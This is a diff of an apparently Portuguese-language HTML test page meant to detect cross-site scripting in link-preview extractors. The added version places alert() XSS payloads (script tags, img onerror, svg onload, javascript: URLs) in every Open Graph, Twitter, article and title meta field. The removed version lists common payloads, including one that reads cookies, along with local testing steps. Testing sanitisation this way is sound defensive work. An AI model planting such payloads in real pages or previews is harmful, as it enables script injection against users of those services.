@@ -3,89 +3,39 @@
 <head>
   <meta charset="UTF-8">
   
-  <!-- Meta tags maliciosas para XSS -->
-  <meta property="og:title" content="<img src=x onerror='alert(&quot;XSS no título!&quot;)'>Clique Aqui">
-  <meta property="og:description" content="<script>alert('XSS na descrição!')</script>Promoção imperdível!">
-  <meta property="og:image" content="javascript:alert('XSS na imagem')">
-  <meta name="description" content="<iframe src='javascript:alert(&quot;XSS!&quot;)'></iframe>">
+  <!-- Open Graph -->
+  <meta property="og:title" content="<img src=x onerror='alert(&quot;XSS: og:title&quot;)'>">
+  <meta property="og:description" content="<script>alert('XSS: og:description')</script>">
+  <meta property="og:image" content="data:image/svg+xml,<svg onload='alert(&apos;XSS: og:image&apos;)' xmlns='http://www.w3.org/2000/svg'></svg>">
+  <meta property="og:url" content="javascript:alert('XSS: og:url')">
+  <meta property="og:site_name" content="<img src=x onerror='alert(&quot;XSS: og:site_name&quot;)'>">
+  <meta property="og:type" content="<script>alert('XSS: og:type')</script>">
+  <meta property="og:video" content="javascript:alert('XSS: og:video')">
+  <meta property="og:audio" content="javascript:alert('XSS: og:audio')">
   
-  <!-- Meta tags normais também -->
-  <meta property="og:url" content="http://localhost:3000">
-  <meta property="og:type" content="website">
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="<script>alert('XSS: twitter:card')</script>">
+  <meta name="twitter:title" content="<img src=x onerror='alert(&quot;XSS: twitter:title&quot;)'>">
+  <meta name="twitter:description" content="<script>alert('XSS: twitter:description')</script>">
+  <meta name="twitter:image" content="data:image/svg+xml,<svg onload='alert(&apos;XSS: twitter:image&apos;)'></svg>">
+  <meta name="twitter:site" content="<script>alert('XSS: twitter:site')</script>">
+  <meta name="twitter:creator" content="<img src=x onerror='alert(&quot;XSS: twitter:creator&quot;)'>">
   
-  <title>&lt;script&gt;alert('XSS no título')&lt;/script&gt;Site Malicioso</title>
+  <!-- Outras Meta Tags -->
+  <meta name="description" content="<script>alert('XSS: description')</script>">
+  <meta name="keywords" content="<img src=x onerror='alert(&quot;XSS: keywords&quot;)'>">
+  <meta name="author" content="<script>alert('XSS: author')</script>">
+  <meta name="robots" content="<script>alert('XSS: robots')</script>">
   
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      max-width: 800px;
-      margin: 50px auto;
-      padding: 20px;
-      background: #f5f5f5;
-    }
-    .warning {
-      background: #fff3cd;
-      border: 2px solid #ffc107;
-      padding: 20px;
-      border-radius: 8px;
-      margin: 20px 0;
-    }
-    .code {
-      background: #2d2d2d;
-      color: #f8f8f2;
-      padding: 15px;
-      border-radius: 5px;
-      overflow-x: auto;
-      margin: 10px 0;
-      font-family: monospace;
-      font-size: 13px;
-    }
-  </style>
+  <!-- Article (para blogs) -->
+  <meta property="article:author" content="<script>alert('XSS: article:author')</script>">
+  <meta property="article:published_time" content="<script>alert('XSS: article:published_time')</script>">
+  <meta property="article:tag" content="<img src=x onerror='alert(&quot;XSS: article:tag&quot;)'>">
+  
+  <title><script>alert('XSS: title')</script>Site Teste</title>
 </head>
 <body>
-  <h1>⚠️ Site Malicioso - Teste de XSS em Preview</h1>
-  
-  <div class="warning">
-    <h2>🔴 Este HTML contém XSS nas meta tags!</h2>
-    <p>Se um app/site extrair essas meta tags SEM sanitizar, vai executar JavaScript malicioso.</p>
-  </div>
-
-  <h3>Meta Tags Maliciosas desta Página:</h3>
-  
-  <div class="code">
-&lt;meta property="og:title" content="&lt;img src=x onerror='alert(\"XSS!\")'&gt;"&gt;
-
-&lt;meta property="og:description" content="&lt;script&gt;alert('XSS!')&lt;/script&gt;"&gt;
-
-&lt;meta property="og:image" content="javascript:alert('XSS')"&gt;
-
-&lt;title&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;Site&lt;/title&gt;
-  </div>
-
-  <h3>Como Testar:</h3>
-  <ol>
-    <li>Rode um servidor: <code>python3 -m http.server 8000</code></li>
-    <li>Crie um extrator de preview VULNERÁVEL (com innerHTML)</li>
-    <li>Aponte para <code>http://localhost:8000</code></li>
-    <li>Veja o XSS executar! 💥</li>
-  </ol>
-
-  <h3>⚠️ Aviso Importante:</h3>
-  <p>
-    Este HTML é apenas para EDUCAÇÃO e TESTES em ambiente local.<br>
-    Nunca use payloads XSS em sites reais ou contra outras pessoas.
-  </p>
-
-  <hr>
-  
-  <h3>Payloads Comuns em Meta Tags:</h3>
-  <ul>
-    <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
-    <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
-    <li><code>&lt;iframe src="javascript:alert(1)"&gt;</code></li>
-    <li><code>javascript:alert(1)</code> (em URLs de imagem)</li>
-    <li><code>&lt;svg onload=alert(1)&gt;</code></li>
-  </ul>
-
+  <h1>🔴 Site com XSS em Todas as Meta Tags</h1>
+  <p>Cada meta tag tem um alert diferente para você identificar qual foi explorada!</p>
 </body>
 </html>
